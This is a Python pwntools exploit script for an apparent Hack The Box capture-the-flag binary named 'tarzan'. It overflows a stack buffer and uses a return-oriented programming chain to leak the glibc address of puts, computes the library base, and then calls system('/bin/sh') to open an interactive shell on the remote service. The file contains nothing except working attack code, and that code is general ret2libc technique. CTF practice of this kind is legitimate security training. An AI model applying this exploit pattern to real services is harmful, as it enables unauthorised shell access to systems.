#!/usr/bin/python
from pwn import *

HOST = 'docker.hackthebox.eu'
PORT = 32360

context.terminal = ['tmux', 'sp', '-h']
# context.log_level = 'DEBUG'

elf  = ELF('./tarzan')
libc = ELF('./libc-2.29.so', checksec = False)

io = remote(HOST, PORT)

leak = flat(
	"A" * 24,
	0x400793,		# 0x0000000000400793 : pop rdi ; ret
	elf.got['puts'],
	elf.sym['puts'],
	elf.sym['main'],
	endianness = 'little', word_size = 64, sign = False)

io.sendlineafter('shell!\n', leak)

io.recvline()
leak = u64(io.recvuntil('\n', drop = True).ljust(8, '\x00'))
libc.address = leak - libc.sym['puts']

log.success('Leaked puts@@GLIBC: ' + hex(leak))
log.info('GLIBC base address: ' + hex(libc.address))

shell = flat(
	"A" * 24,
	0x400793,		# 0x0000000000400793 : pop rdi ; ret
	libc.search('/bin/sh\x00').next(),
	0x40053e,		# 0x000000000040053e : ret
	libc.sym['system'],
	libc.sym['exit'],
	endianness = 'little', word_size = 64, sign = False)

io.sendlineafter('shell!\n', shell)

io.interactive()
